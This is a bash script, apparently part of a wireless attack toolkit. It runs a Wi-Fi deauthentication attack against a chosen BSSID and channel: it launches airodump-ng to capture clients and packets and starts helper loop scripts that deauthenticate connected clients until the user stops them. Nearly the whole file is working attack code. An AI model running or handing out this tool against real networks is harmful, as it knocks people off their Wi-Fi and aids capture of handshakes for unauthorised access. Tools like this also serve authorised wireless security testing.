#!/bin/bash

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
bold=$(tput bold)
tdef=$(tput sgr0)

bssid="null"
ch="null"
iface="null"

declare -a clients

cl_list="clients-01.csv"
clcap_list="clients-01.cap"

macrgx="^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$"

s_info () {
    printf "Deauthentication attack"
    exit 0
}

get_input () {
    read -p "${green}${bold}>${tdef} " input
}

start () {
    [ -e "$cl_list" ] && rm -f "$cl_list"
    [ -e "$clcap_list" ] && rm -f "$clcap_list"
    
    xterm -T "Client List" -fg white -bg black -geometry 90x40-50+50 -e "airodump-ng ${iface} -d ${bssid} -a -c ${ch} -I 2 -w clients -o csv -o pcap" &> /dev/null &
    c_air_pid=$!

    "$SCRIPT_DIR"/deauth/client-loop.sh $bssid &
    c_cloop_pid=$!

    read -p "Press Return to start deauthing clients. "
    printf "\n"

    "$SCRIPT_DIR"/deauth/attack-loop.sh $iface $bssid  &
    c_aloop_pid=$!

    # xterm -fg red -bg black -T "Deauth ${bssid}" -e "a"
    printf "Started attack to ${bold}${bssid}${tdef} at channel ${bold}${ch}${tdef}.\n\n"

    read -p "Press Return to end the attack. "

    kill $c_air_pid
    kill $c_cloop_pid
    kill $c_aloop_pid
    
    printf "\n"
}

main () {
    while test $# -gt 0
    do
        if [ $1 = "--info" ]
        then
            s_info
        elif [ $1 = "--bssid" ]
        then
            bssid="$2"
        elif [ $1 = "--ch" ]
        then
            ch="$2"
        elif [ $1 = "--iface" ]
        then
            iface="$2"
        fi

        shift
    done

    if [[  $bssid = "null" || $bssid = "[null]" ]]
    then
        printf "BSSID not found.\n"
        exit 0
    fi

    start
}

main $@